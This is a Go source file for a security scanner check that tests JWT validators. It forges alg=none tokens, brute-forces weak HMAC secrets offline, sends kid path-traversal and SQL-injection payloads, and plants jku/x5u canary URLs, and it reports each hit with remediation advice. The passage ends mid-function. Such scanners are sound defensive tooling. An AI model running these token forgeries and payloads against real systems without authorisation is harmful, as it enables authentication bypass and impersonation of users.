package checks

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"hash"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/londonmax12/hyperz/internal/httpclient"
	"github.com/londonmax12/hyperz/internal/oob"
	"github.com/londonmax12/hyperz/internal/page"
	"github.com/londonmax12/hyperz/internal/scope"
)

// JWTVulns probes JSON Web Token validators for the common implementation
// bugs that turn a signature-bearing token into a forgeable bearer: alg=none
// acceptance, weak HS256 secrets, kid header treated as a filesystem path
// or as an unsanitised SQL fragment, and jku/x5u acceptance of attacker-
// controlled key URLs.
//
// Scope gate: the check is a no-op unless a JWT is observed in the page
// the crawler already fetched (Set-Cookie values, response headers, or
// the response body). A page without an issued token is dispatched and
// skipped without sending a single probe, so the aggressive label here
// is bounded by token discovery rather than by raw URL count.
//
// Active probes target the URL where the token was observed; we cannot
// pick a different protected resource because the crawl does not tell
// us which URLs the token actually authenticates. The oracle handles
// this: when the page does not differentiate authenticated from
// unauthenticated responses, the active probes return no signal and
// only the offline HS256 brute can fire.
//
// Probes:
//
//   1. alg=none: the header alg is rewritten to "none" and the signature
//      segment is emptied. A validator that doesn't pin alg against an
//      expected set will accept the forgery as if it carried our payload.
//   2. Weak HS256 secret: when the original token is HS256/384/512, the
//      check tries a curated list of well-known weak secrets offline.
//      A successful HMAC verify yields the secret outright; no probe
//      traffic is sent for this branch, but the finding still fires.
//   3. kid path traversal: kid is set to "/dev/null" (and a traversal
//      sibling) and the token is re-signed with an empty key, which is
//      what an implementation reading the file would derive. Validators
//      that splice kid into a filesystem path accept the forgery.
//   4. kid SQL injection: kid is set to a SQL-break payload and the
//      token is re-signed with an empty key. Detection fires on driver
//      error patterns in the response (the implementation issued the
//      query) or on the manipulated token being accepted (the injection
//      coerced the key lookup into returning the empty key we used).
//   5. jku/x5u presence: if the original header carries either, a
//      passive advisory is emitted. When --oob is on, an additional
//      active probe forges a token carrying canary URLs in both jku
//      and x5u and sends it back through the same channel; a callback
//      landing on either canary proves the validator fetches attacker-
//      controlled key URLs and graduates the finding to Critical via
//      the Drain pass.
//
// Per-token result: a token is probed exactly once per scan no matter
// how many crawled pages echoed it back. The cache is keyed on the
// token fingerprint (a SHA-1 prefix of the wire bytes) so two distinct
// tokens issued by the same host still both get probed.
//
// Level: Aggressive. The offline brute is invisible from the network,
// but the active probes send forged tokens against the application and
// the kid-SQLi variant sends shapes that load-shedding WAFs will flag.
// Loads only when the operator opts in via --pollute, alongside the
// other state-mutating / disruptive checks.
type JWTVulns struct {
	mu sync.Mutex
	// probed deduplicates token fingerprints across all pages so the
	// same JWT observed on N crawled pages does not burn N probe
	// sequences. The set is closed-on-entry: a token landing here means
	// some earlier goroutine took the probes for it.
	probed map[string]struct{}
}

func (*JWTVulns) Name() string { return "jwt-vulns" }

func (*JWTVulns) Level() Level { return LevelAggressive }

// Budget covers, in the worst case, two baseline probes plus one probe
// per kid-traversal variant, one per HS256 secret skipped (offline so
// negligible), and one alg=none probe, each capable of hitting the
// per-request timeout. 3 minutes matches the active SQLi budgets.
func (*JWTVulns) Budget() time.Duration { return 3 * time.Minute }

// jwtBodyCap bounds response bodies the check buffers for oracle
// comparison. 64 KiB is enough for a templated dashboard to score
// stably under Similarity while keeping a single probe from soaking
// up megabytes if the application proxies large pages back.
const jwtBodyCap = 64 << 10

// jwtTokenRe matches the wire form of a JWT: three url-safe-base64
// segments joined by dots, anchored on the "eyJ" prefix that every
// base64url-encoded "{\"" header begins with. The minimum segment
// length defends against matching unrelated dotted tokens that happen
// to live in a body.
var jwtTokenRe = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*`)

// weakHS256Secrets is the offline wordlist tried against any observed
// HMAC-signed token. Kept short on purpose: every entry costs one
// HMAC per token per algorithm, but every entry past the obvious
// defaults just inflates a list that should be measured by what gets
// past production code review, not by what fits in a megabyte
// rockyou.txt clone. Entries are drawn from JWT library docs ("your-
// 256-bit-secret" is the literal placeholder in jwt.io samples),
// framework defaults, and the perennial low-hanging passwords.
var weakHS256Secrets = []string{
	"",
	"secret",
	"Secret",
	"SECRET",
	"password",
	"Password",
	"123456",
	"changeme",
	"admin",
	"test",
	"default",
	"jwt",
	"jwtsecret",
	"jwt_secret",
	"jwt-secret",
	"token",
	"key",
	"private",
	"supersecret",
	"super_secret",
	"hmac",
	"your-256-bit-secret",
	"your-384-bit-secret",
	"your-512-bit-secret",
	"my-secret",
	"my_secret",
	"mySecret",
	"my-256-bit-secret",
	"shhh",
	"qwerty",
	"abc123",
	"letmein",
	"hello",
	"world",
	"helloworld",
	"helloWorld",
	"$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy",
}

// kidPathTraversalPayloads are kid values that a validator splicing
// kid into a filesystem path would resolve to an empty file. /dev/null
// is the canonical empty handle on Unix; the traversal sibling covers
// implementations that prepend a non-empty key directory.
var kidPathTraversalPayloads = []string{
	"/dev/null",
	"../../../../../../dev/null",
}

// kidSQLiPayloads are kid values that a validator splicing kid into a
// raw SQL key lookup would either error on or coerce into returning
// the empty key bytes we re-sign with. The first two are pure error
// shapes (detection via SQL driver patterns in the response); the
// third forces a UNION that returns an empty string the implementation
// would treat as the signing key.
var kidSQLiPayloads = []string{
	`x' OR '1'='1`,
	`x'; SELECT 1-- -`,
	`x' UNION SELECT ''-- -`,
}

// jwtSource describes where on the page the check observed a token,
// because that controls how a probe sends the (modified) token back.
// A token mined from a Set-Cookie ride back on a Cookie header with
// the same name; anything else falls through to Authorization: Bearer,
// which is the standard for body- or header-issued tokens.
type jwtSource struct {
	raw        string
	cookieName string
	headerName string
	fromBody   bool
}

// parsedJWT is the decoded structural view of a token. header is the
// JSON-decoded JOSE header (we never re-encode from this map: probe
// builders mutate a fresh map each time so the original encoding
// shape on the wire is preserved). payload is the decoded claims
// segment, kept as raw bytes for re-encoding bit-exact under each
// forged signature. signing is the unmodified "header.payload" string
// that HMAC verification is computed over.
type parsedJWT struct {
	headerRaw    []byte
	header       map[string]any
	payloadRaw   []byte
	payloadB64   string
	headerB64    string
	signatureB64 string
	signature    []byte
	signing      string
}

// jwtOracle captures the two reference points active probes compare
// their responses to. baselineAuth is the response when the original
// token is sent back at the page URL; baselineNoAuth is the response
// with no token attached. When the two are indistinguishable, the
// page does not actually authorise off the token and the active
// probes return no oracle signal.
type jwtOracle struct {
	auth   jwtSnapshot
	noAuth jwtSnapshot
	usable bool
}

type jwtSnapshot struct {
	status int
	body   []byte
}

func (c *JWTVulns) Run(ctx context.Context, client *httpclient.Client, sc *scope.Scope, p page.Page) ([]Finding, error) {
	u, err := url.Parse(p.URL)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return nil, nil
	}
	if u.Scheme != "http" && u.Scheme != "https" {
		return nil, nil
	}
	if !allows(sc, u) {
		return nil, nil
	}

	sources := harvestJWTs(p)
	if len(sources) == 0 {
		return nil, nil
	}

	var findings []Finding
	for _, src := range sources {
		fp := tokenFingerprint(src.raw)
		c.mu.Lock()
		if c.probed == nil {
			c.probed = map[string]struct{}{}
		}
		if _, ok := c.probed[fp]; ok {
			c.mu.Unlock()
			continue
		}
		c.probed[fp] = struct{}{}
		c.mu.Unlock()

		parsed, err := parseJWT(src.raw)
		if err != nil {
			Report(ctx, fmt.Errorf("jwt parse %s: %w", redactToken(src.raw), err))
			continue
		}
		findings = append(findings, c.probeToken(ctx, client, p.URL, src, parsed)...)
	}
	return findings, nil
}

// probeToken runs every sub-probe for one token in the order:
// offline HS256 brute, then the network probes (alg=none, kid
// traversal, kid SQLi, asymmetric->HMAC algorithm confusion, crit
// abuse), then the passive jku/x5u and kid-as-URL advisories. The
// network probes share a single oracle so we don't issue two
// baselines per token.
func (c *JWTVulns) probeToken(ctx context.Context, client *httpclient.Client, target string, src jwtSource, parsed *parsedJWT) []Finding {
	var findings []Finding

	weakSecret, weakSecretFound := "", false
	alg := strings.ToUpper(asString(parsed.header["alg"]))
	if hashFor(alg) != nil {
		if secret, ok := tryWeakHMACSecret(parsed, alg); ok {
			weakSecret, weakSecretFound = secret, true
			findings = append(findings, buildWeakSecretFinding(target, parsed, alg, secret))
		}
	}

	if f := buildJKUFinding(target, parsed); f != nil {
		findings = append(findings, *f)
	}
	if f := buildKidAsURLFinding(target, parsed); f != nil {
		findings = append(findings, *f)
	}

	if srv := OOBFrom(ctx); srv != nil {
		if err := c.probeOOBKeyURL(ctx, client, srv, target, src, parsed); err != nil {
			Report(ctx, fmt.Errorf("jwt oob jku/x5u %s: %w", target, err))
		}
	}

	if ctx.Err() != nil {
		return findings
	}

	oracle, err := c.buildOracle(ctx, client, target, src)
	if err != nil {
		Report(ctx, fmt.Errorf("jwt oracle %s: %w", target, err))
		return findings
	}
	if !oracle.usable {
		// The token doesn't differentiate responses on this URL, so
		// network probes can't tell "accepted" from "rejected".
		// Offline / passive findings above are still kept.
		return findings
	}

	algNoneAccepted := false
	if f := c.probeAlgNone(ctx, client, target, src, parsed, oracle); f != nil {
		findings = append(findings, *f)
		algNoneAccepted = true
	}
	if alg == "" || hashFor(alg) != nil {
		// kid manipulations only re-sign in HMAC form; they don't
		// apply to a token already using an asymmetric algorithm
		// because the validator branch we're testing is HMAC-keyed.
		for _, payload := range kidPathTraversalPayloads {
			if ctx.Err() != nil {
				break
			}
			if f := c.probeKidTraversal(ctx, client, target, src, parsed, oracle, payload); f != nil {
				findings = append(findings, *f)
				break
			}
		}
		for _, payload := range kidSQLiPayloads {
			if ctx.Err() != nil {
				break
			}
			if f := c.probeKidSQLi(ctx, client, target, src, parsed, oracle, payload); f != nil {
				findings = append(findings, *f)
				break
			}
		}
	}
	if ctx.Err() == nil {
		if f := c.probeAlgConfusion(ctx, client, target, src, parsed, oracle); f != nil {
			findings = append(findings, *f)
		}
	}
	if ctx.Err() == nil {
		if f := c.probeCritAbuse(ctx, client, target, src, parsed, oracle, weakSecret, weakSecretFound, algNoneAccepted); f != nil {
			findings = append(findings, *f)
		}
	}
	return findings
}

// buildOracle issues two reference requests: the page URL with the
// original token attached (authAuth baseline) and the same URL with
// the token stripped (noAuth baseline). The pair is usable as an
// oracle only when the two responses meaningfully differ.
func (c *JWTVulns) buildOracle(ctx context.Context, client *httpclient.Client, target string, src jwtSource) (jwtOracle, error) {
	auth, err := c.send(ctx, client, target, src, src.raw)
	if err != nil {
		return jwtOracle{}, err
	}
	noAuth, err := c.send(ctx, client, target, src, "")
	if err != nil {
		return jwtOracle{}, err
	}
	usable := auth.status != noAuth.status || Similarity(auth.body, noAuth.body) < SimilarityThreshold
	return jwtOracle{auth: auth, noAuth: noAuth, usable: usable}, nil
}

// probeAlgNone rewrites the JOSE alg field to "none" with each of the
// common case variants ("none", "None", "NONE") to defeat naive case-
// sensitive deny-lists. The signature segment is emptied per RFC 7519
// alg=none semantics.
func (c *JWTVulns) probeAlgNone(ctx context.Context, client *httpclient.Client, target string, src jwtSource, parsed *parsedJWT, oracle jwtOracle) *Finding {
	for _, variant := range []string{"none", "None", "NONE", "nOnE"} {
		if ctx.Err() != nil {
			return nil
		}
		hdr := cloneHeader(parsed.header)
		hdr["alg"] = variant
		delete(hdr, "kid")
		token, err := assembleToken(hdr, parsed.payloadRaw, nil)
		if err != nil {
			continue
		}
		probe, err := c.send(ctx, client, target, src, token)
		if err != nil {
			continue
		}
		if !looksAccepted(probe, oracle) {
			continue
		}
		detail := fmt.Sprintf(
			"The validator accepted a JWT whose JOSE header advertises alg=%q with an empty signature. "+
				"The original token used %s; replacing the algorithm and dropping the signature still produced a "+
				"response that matches the authenticated baseline (status %d, similarity %.3f to auth / %.3f to no-auth) "+
				"rather than the unauthenticated one. An attacker can forge arbitrary claims (sub, role, scopes) and "+
				"trivially impersonate any user the application identifies via this token.",
			variant, asString(parsed.header["alg"]),
			probe.status,
			Similarity(probe.body, oracle.auth.body),
			Similarity(probe.body, oracle.noAuth.body),
		)
		return &Finding{
			Check:    (&JWTVulns{}).Name(),
			Target:   target,
			URL:      target,
			Severity: SeverityCritical,
			Title:    "JWT validator accepts alg=none (signature bypass)",
			Detail:   detail,
			CWE:      "CWE-347",
			OWASP:    "A02:2021 Cryptographic Failures",
			Remediation: "Pin the accepted algorithm set at the validator and reject any token whose JOSE alg field is " +
				"\"none\" (in any casing) or differs from what was configured. Most JWT libraries expose an explicit " +
				"algorithms parameter on the verify call - pass exactly the algorithm your tokens are signed with, " +
				"never the alg value off the incoming header. If your library only takes a key, switch to one that " +
				"accepts an algorithm allow-list; otherwise add a wrapper that rejects unsigned tokens before verify.",
			Evidence: &Evidence{
				Method:     http.MethodGet,
				RequestURL: target,
				Status:     probe.status,
				Snippet: fmt.Sprintf(
					"Original alg: %s\nForged alg: %s\nForged token: %s\nAuth baseline: status=%d\nNo-auth baseline: status=%d\nProbe response: status=%d\nSimilarity to auth: %.3f\nSimilarity to no-auth: %.3f",
					asString(parsed.header["alg"]), variant, redactToken(token),
					oracle.auth.status, oracle.noAuth.status, probe.status,
					Similarity(probe.body, oracle.auth.body),
					Similarity(probe.body, oracle.noAuth.body),
				),
			},
			DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "alg-none"),
		}
	}
	return nil
}

// probeKidTraversal forges a token whose kid header points at an
// empty file and whose signature is HMAC-SHA256 over the empty key
// bytes. Implementations that splice kid into a filesystem path read
// the file (empty), feed empty bytes to HMAC, and accept the token.
func (c *JWTVulns) probeKidTraversal(ctx context.Context, client *httpclient.Client, target string, src jwtSource, parsed *parsedJWT, oracle jwtOracle, kid string) *Finding {
	hdr := cloneHeader(parsed.header)
	hdr["alg"] = "HS256"
	hdr["kid"] = kid
	sig := hmacSign(sha256.New, nil, headerPayloadSigning(hdr, parsed.payloadRaw))
	token, err := assembleToken(hdr, parsed.payloadRaw, sig)
	if err != nil {
		return nil
	}
	probe, err := c.send(ctx, client, target, src, token)
	if err != nil {
		return nil
	}
	if !looksAccepted(probe, oracle) {
		return nil
	}
	detail := fmt.Sprintf(
		"The validator accepted a JWT whose JOSE kid header is %q, a path that resolves to an empty file on POSIX systems. "+
			"The probe re-signed with HMAC-SHA256 over empty key bytes - the key an implementation that splices kid into "+
			"a filesystem path would derive after reading the empty file. The forged token landed at the authenticated "+
			"baseline (status %d, similarity %.3f to auth / %.3f to no-auth) rather than the unauthenticated one. An "+
			"attacker can chain this with path traversal in kid to read other files (sourcing the key from any predictable "+
			"empty/known content) and forge tokens at will.",
		kid, probe.status,
		Similarity(probe.body, oracle.auth.body),
		Similarity(probe.body, oracle.noAuth.body),
	)
	return &Finding{
		Check:    (&JWTVulns{}).Name(),
		Target:   target,
		URL:      target,
		Severity: SeverityCritical,
		Title:    "JWT kid header resolves to filesystem path (key injection)",
		Detail:   detail,
		CWE:      "CWE-22, CWE-347",
		OWASP:    "A01:2021 Broken Access Control",
		Remediation: "Treat kid as an opaque identifier, never as a filesystem path. Look kid up in a fixed allow-list of " +
			"known key IDs (or in a database query parameterised against a typed kid column) and reject any kid that " +
			"doesn't resolve. Canonicalise the value before lookup - reject anything containing path separators, " +
			"\"..\", or NUL bytes - so a future change in lookup strategy can't reintroduce the bug.",
		Evidence: &Evidence{
			Method:     http.MethodGet,
			RequestURL: target,
			Status:     probe.status,
			Snippet: fmt.Sprintf(
				"Forged kid: %s\nForged token: %s\nAuth baseline: status=%d\nNo-auth baseline: status=%d\nProbe response: status=%d\nSimilarity to auth: %.3f\nSimilarity to no-auth: %.3f",
				kid, redactToken(token),
				oracle.auth.status, oracle.noAuth.status, probe.status,
				Similarity(probe.body, oracle.auth.body),
				Similarity(probe.body, oracle.noAuth.body),
			),
		},
		DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "kid-path-traversal"),
	}
}

// probeKidSQLi forges a token whose kid header carries a SQL break
// payload. Two detection signals: a SQL driver error pattern in the
// response body (the implementation issued the query at all is the
// bug we want to surface) or the manipulated token producing an
// authenticated response (the injection coerced the lookup into
// returning the empty key bytes we re-signed with).
func (c *JWTVulns) probeKidSQLi(ctx context.Context, client *httpclient.Client, target string, src jwtSource, parsed *parsedJWT, oracle jwtOracle, kid string) *Finding {
	hdr := cloneHeader(parsed.header)
	hdr["alg"] = "HS256"
	hdr["kid"] = kid
	sig := hmacSign(sha256.New, nil, headerPayloadSigning(hdr, parsed.payloadRaw))
	token, err := assembleToken(hdr, parsed.payloadRaw, sig)
	if err != nil {
		return nil
	}
	probe, err := c.send(ctx, client, target, src, token)
	if err != nil {
		return nil
	}
	patterns := matchSQLPatterns(probe.body)
	patternsInBaseline := matchSQLPatterns(oracle.auth.body)
	newPatterns := subtractPatterns(patterns, patternsInBaseline)
	accepted := looksAccepted(probe, oracle)
	if len(newPatterns) == 0 && !accepted {
		return nil
	}
	var detail string
	switch {
	case len(newPatterns) > 0 && accepted:
		detail = fmt.Sprintf(
			"The validator spliced the JWT kid header into a SQL key lookup. Probe kid value %q produced new database "+
				"driver error pattern(s) %v in the response AND landed at the authenticated baseline (status %d, "+
				"similarity %.3f to auth) - the injection both reached the SQL layer and coerced the lookup into "+
				"returning the empty key the probe re-signed with.",
			kid, newPatterns, probe.status, Similarity(probe.body, oracle.auth.body))
	case len(newPatterns) > 0:
		detail = fmt.Sprintf(
			"The validator spliced the JWT kid header into a SQL key lookup. Probe kid value %q produced new database "+
				"driver error pattern(s) %v that were absent from the authenticated baseline. The implementation is "+
				"concatenating user-controlled header bytes into a SQL statement; an attacker can pivot from this to "+
				"forging tokens (by coercing the lookup to return a predictable key) or to authentication bypass.",
			kid, newPatterns)
	default:
		detail = fmt.Sprintf(
			"The validator accepted a JWT whose kid header is %q, a SQL injection payload designed to coerce the key "+
				"lookup into returning the empty key the probe re-signed with. The forged token landed at the "+
				"authenticated baseline (status %d, similarity %.3f to auth / %.3f to no-auth).",
			kid, probe.status,
			Similarity(probe.body, oracle.auth.body),
			Similarity(probe.body, oracle.noAuth.body),
		)
	}
	severity := SeverityHigh
	if accepted {
		severity = SeverityCritical
	}
	return &Finding{
		Check:    (&JWTVulns{}).Name(),
		Target:   target,
		URL:      target,
		Severity: severity,
		Title:    "JWT kid header concatenated into SQL key lookup",
		Detail:   detail,
		CWE:      "CWE-89, CWE-347",
		OWASP:    "A03:2021 Injection",
		Remediation: "Look up kid through a parameterised query (kid as a bound parameter, not a concatenated string) " +
			"and prefer a hardcoded map of known kid values to a free-form database lookup. Apply the same canonicalisation " +
			"rules as for path-based kid resolvers: reject quote characters, comment sequences, and any byte outside an " +
			"allow-list of identifier characters before the value reaches the query layer.",
		Evidence: &Evidence{
			Method:     http.MethodGet,
			RequestURL: target,
			Status:     probe.status,
			Snippet: fmt.Sprintf(
				"Forged kid: %s\nForged token: %s\nNew SQL error patterns: %v\nProbe response: status=%d\nSimilarity to auth: %.3f\nSimilarity to no-auth: %.3f",
				kid, redactToken(token), newPatterns, probe.status,
				Similarity(probe.body, oracle.auth.body),
				Similarity(probe.body, oracle.noAuth.body),
			),
		},
		DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "kid-sqli"),
	}
}

// send issues one GET to target with the supplied token attached
// through whichever channel the source used, and reads a capped body.
// An empty token means "send no token at all", which is how the
// no-auth baseline differs from the auth baseline.
func (c *JWTVulns) send(ctx context.Context, client *httpclient.Client, target string, src jwtSource, token string) (jwtSnapshot, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		return jwtSnapshot{}, err
	}
	if token != "" {
		switch {
		case src.cookieName != "":
			req.Header.Set("Cookie", src.cookieName+"="+token)
		case src.headerName != "" && !strings.EqualFold(src.headerName, "set-cookie"):
			req.Header.Set(src.headerName, token)
		default:
			req.Header.Set("Authorization", "Bearer "+token)
		}
	}
	resp, err := client.DoNoFollow(ctx, req)
	if err != nil {
		return jwtSnapshot{}, err
	}
	defer resp.Body.Close()
	body, _, err := httpclient.ReadBodyCapped(resp, jwtBodyCap)
	if err != nil {
		return jwtSnapshot{}, err
	}
	return jwtSnapshot{status: resp.StatusCode, body: body}, nil
}

// looksAccepted reports whether probe behaves like the authenticated
// baseline instead of the unauthenticated one. Both signals must
// align: same status as auth AND similar body to auth AND distinct
// from no-auth on at least one of those axes. Otherwise an API that
// always returns 200 plus a JSON error would collapse into a false
// positive.
func looksAccepted(probe jwtSnapshot, oracle jwtOracle) bool {
	authSim := Similarity(probe.body, oracle.auth.body)
	noAuthSim := Similarity(probe.body, oracle.noAuth.body)
	if probe.status != oracle.auth.status {
		return false
	}
	if probe.status == oracle.noAuth.status && noAuthSim >= SimilarityThreshold {
		return false
	}
	return authSim >= SimilarityThreshold
}

// buildWeakSecretFinding fires when offline HMAC verification recovered
// the token's signing secret from the curated wordlist. No network
// probe is needed: the math proved the secret end-to-end.
func buildWeakSecretFinding(target string, parsed *parsedJWT, alg, secret string) Finding {
	display := secret
	if display == "" {
		display = "<empty string>"
	}
	detail := fmt.Sprintf(
		"The JWT issued by this application is signed with %s under a well-known weak secret (%q). The check "+
			"verified the signature offline against a curated wordlist; no probe traffic was sent. An attacker who "+
			"observes any token (network capture, browser storage, log file) can forge arbitrary claims under the "+
			"same secret and impersonate any user the application identifies via this token.",
		alg, display)
	return Finding{
		Check:    (&JWTVulns{}).Name(),
		Target:   target,
		URL:      target,
		Severity: SeverityCritical,
		Title:    "JWT signed with well-known weak HMAC secret",
		Detail:   detail,
		CWE:      "CWE-798, CWE-347",
		OWASP:    "A02:2021 Cryptographic Failures",
		Remediation: "Rotate the signing key immediately - assume every token issued to date is forgeable. Generate a " +
			"key of at least 256 bits of entropy from a CSPRNG (crypto/rand on Go, secrets.token_bytes on Python, " +
			"crypto.randomBytes on Node) and store it as a server-side secret, never a config string in source. For " +
			"long-term hardening, prefer an asymmetric algorithm (RS256, ES256, EdDSA) so the verifier never sees the " +
			"signing key at all.",
		Evidence: &Evidence{
			RequestURL: target,
			Snippet: fmt.Sprintf(
				"Algorithm: %s\nRecovered secret: %q\nToken (redacted): %s",
				alg, display, redactToken(parsed.signing+"."+parsed.signatureB64),
			),
		},
		DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "weak-hmac-secret", tokenFingerprint(parsed.signing+"."+parsed.signatureB64)),
	}
}

// probeOOBKeyURL forges JWTs whose JOSE headers carry canary URLs in
// the jku and x5u fields and sends them through the source channel.
// Each field is exercised in its own token so attribution is clean
// and a validator that rejects tokens carrying any unknown header
// still gets a fair test of each field in isolation. alg is rewritten
// to RS256 because most JWT libraries gate jku/x5u handling on an
// asymmetric algorithm; the signature bytes are garbage because the
// validator fetches the key URL before signature verification (or
// fails after the fetch - either way the listener-side hit is the
// signal). No finding is emitted here: Drain emits one Critical
// finding per registration whose canary received a callback.
func (c *JWTVulns) probeOOBKeyURL(ctx context.Context, client *httpclient.Client, srv oob.Server, target string, src jwtSource, parsed *parsedJWT) error {
	for _, field := range []string{"jku", "x5u"} {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		canary := srv.Register((&JWTVulns{}).Name(), map[string]string{
			"target":       target,
			"field":        field,
			"original_alg": asString(parsed.header["alg"]),
			"token_fp":     tokenFingerprint(src.raw),
		})
		hdr := cloneHeader(parsed.header)
		hdr["alg"] = "RS256"
		hdr[field] = canary.HTTPURL
		// Mutually exclude the other field so a validator that
		// dereferences only the first header it sees does not
		// silently swallow this canary in favour of a stale value
		// from the original token.
		if field == "jku" {
			delete(hdr, "x5u")
		} else {
			delete(hdr, "jku")
		}
		if _, ok := hdr["kid"]; !ok {
			hdr["kid"] = "hyperz-probe"
		}
		token, err := assembleToken(hdr, parsed.payloadRaw, []byte("hyperz-probe-signature"))
		if err != nil {
			return err
		}
		if _, err := c.send(ctx, client, target, src, token); err != nil {
			return err
		}
	}
	return nil
}

// Drain emits one Critical finding per OOB registration whose canary
// observed at least one callback. Called once by the scanner after
// the active phase plus the operator-configured wait window. Reads
// state off the server (Registrations / Hits) rather than the check
// struct, per the OOBCheck contract.
func (c *JWTVulns) Drain(ctx context.Context) []Finding {
	srv := OOBFrom(ctx)
	if srv == nil {
		return nil
	}
	var out []Finding
	for _, reg := range srv.Registrations((&JWTVulns{}).Name()) {
		hits := srv.Hits(reg.Canary.Token)
		if len(hits) == 0 {
			continue
		}
		out = append(out, buildJWTKeyURLOOBFinding(reg, hits))
	}
	return out
}

// buildJWTKeyURLOOBFinding renders one OOB-confirmed jku/x5u finding
// from a canary registration and its hits. Severity is Critical: an
// OOB callback proves the validator both processed the header and
// reached the scanner's egress, which is the precondition for forging
// tokens by hosting a JWKS the validator will trust.
func buildJWTKeyURLOOBFinding(reg oob.Registration, hits []oob.Hit) Finding {
	target := reg.Extra["target"]
	field := reg.Extra["field"]
	originalAlg := reg.Extra["original_alg"]
	hit := hits[0]
	ua := hit.Headers.Get("User-Agent")
	detail := fmt.Sprintf(
		"A forged JWT carrying a canary URL in the %s header caused the validator to issue an HTTP request "+
			"that landed on the OOB listener (method=%s, source=%s, user-agent=%q, %d hit(s)). The original "+
			"token was signed with %s. An attacker can host a JWKS at any URL the validator will accept in "+
			"%s, sign tokens against the matching private key, and have the validator trust forged claims.",
		field, hit.Method, hit.SourceAddr, ua, len(hits), originalAlg, field)
	return Finding{
		Check:    (&JWTVulns{}).Name(),
		Target:   target,
		URL:      target,
		Severity: SeverityCritical,
		Title:    fmt.Sprintf("JWT validator fetches attacker-controlled %s URL (OOB-confirmed)", field),
		Detail:   detail,
		CWE:      "CWE-347, CWE-918",
		OWASP:    "A05:2021 Security Misconfiguration",
		Remediation: "Disable " + field + " handling at the validator unless you have a concrete need for it. If you do, " +
			"pin the allowed URLs to a fixed same-origin allow-list, never trust the value off the incoming token, and " +
			"validate that the fetched JWKS is served from an authenticated channel. Prefer embedding the JWK set in " +
			"configuration so the validator never makes an outbound HTTP call during verification.",
		Evidence: &Evidence{
			RequestURL: target,
			Snippet: fmt.Sprintf(
				"Header field: %s\nCanary URL: %s\nFirst hit: %s %s from %s at %s\nUser-Agent: %s\nTotal hits: %d",
				field, reg.Canary.HTTPURL,
				hit.Method, hit.Path, hit.SourceAddr,
				hit.Timestamp.Format(time.RFC3339), ua, len(hits)),
		},
		DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "oob-key-url", field, reg.Extra["token_fp"]),
	}
}

// buildJKUFinding emits a passive advisory when the token already
// carries jku or x5u. Active validation of these requires an out-of-
// band server returning forged keys, which the scanner does not host;
// the header presence itself is the actionable signal because every
// trustworthy validator either rejects jku/x5u outright or restricts
// it to a hardcoded same-origin allow-list.
func buildJKUFinding(target string, parsed *parsedJWT) *Finding {
	jku := asString(parsed.header["jku"])
	x5u := asString(parsed.header["x5u"])
	if jku == "" && x5u == "" {
		return nil
	}
	field, value := "jku", jku
	if jku == "" {
		field, value = "x5u", x5u
	}
	detail := fmt.Sprintf(
		"The JWT carries a %s header pointing at %q. RFC 7515 lets the validator fetch the URL and trust the keys it "+
			"returns - a validator that does not pin the URL to a fixed same-origin allow-list will accept a token "+
			"signed by any key an attacker can host. Active exploitation requires a controlled URL the validator "+
			"reaches; this finding is the structural advisory.",
		field, value)
	return &Finding{
		Check:    (&JWTVulns{}).Name(),
		Target:   target,
		URL:      target,
		Severity: SeverityMedium,
		Title:    fmt.Sprintf("JWT carries %s header (attacker-controlled key URL risk)", field),
		Detail:   detail,
		CWE:      "CWE-347, CWE-918",
		OWASP:    "A05:2021 Security Misconfiguration",
		Remediation: "Disable jku/x5u handling at the validator unless you have a concrete need for it. If you do, pin the " +
			"allowed URLs to a fixed same-origin allow-list, never trust the value off the incoming token, and validate " +
			"that the fetched JWKS is served from an authenticated channel. Prefer embedding the JWK set in configuration " +
			"so the validator never makes an outbound HTTP call during verification.",
		Evidence: &Evidence{
			RequestURL: target,
			Snippet:    fmt.Sprintf("Header field: %s\nValue: %s\nHeader JSON: %s", field, value, string(parsed.headerRaw)),
		},
		DedupeKey: MakeKey((&JWTVulns{}).Name(), ScopeHost, target, "jku-x5u", field),
	}
}

// buildKidAsURLFinding emits a passive advisory when the kid header
// value is structured as a URL. RFC 7515 does not assign URL
// semantics to kid, but several libraries have shipped (and shipped
// CVEs for) treating an http:// kid as a fetch target equivalent to
// jku. The advisory exists so a reviewer notices the misuse before a
// future library upgrade activates the URL fetch path.
func buildKidAsURLFinding(target string, parsed *parsedJWT) *Finding {
	kid := asString(parsed.header["kid"])
	if !kidLooksLikeURL(kid) {
		return nil
	}
	detail := fmt.Sprintf(
		"The JWT carries a kid header structured as a URL (%q). RFC 7515 §4.1.4 defines kid as an opaque hint, not a "+
			"URL; libraries that have historically dereferenced kid as if it were jku (multiple CVEs across "+
			"node-jsonwebtoken downstream wrappers and Java jose-jwt forks) silently fetch attacker-controlled keys "+
			"from this value. Active exploitation requires a controlled URL the validator reaches; this finding is "+
			"the structural advisory.",
		kid)
	return &Finding{
		Check:    (&JWTVulns{}).Name(),
		Target:   target,
		URL:      target,
		Severity: SeverityLow,
		Title:    "JWT kid header is a URL (attacker-controlled key fetch risk)",
		Detail:   detail,
		CWE:      "CWE-347, CWE-918",
		OWASP:    "A05:2021 Security Misconfiguration",
		Remediation: "Treat kid as an opaque identifier; look it up against a fixed allow-list of known key IDs and never " +
			"feed the value into a URL fetcher. Canonicalise before lookup - reject anything containing \"://\", a " +
			"leading \"//\", or any byte outside an allow-list of identifier characters - so a future library upgrade " +
			"cannot reintroduce a URL fetch from kid.",
		Evidence: &Evidence{
			RequestURL: target,
			Snippet:    fmt.Sprintf("Header field: kid\nValue: %s\nHeader JSON: %s", kid, string(parsed.headerRaw)),
		},
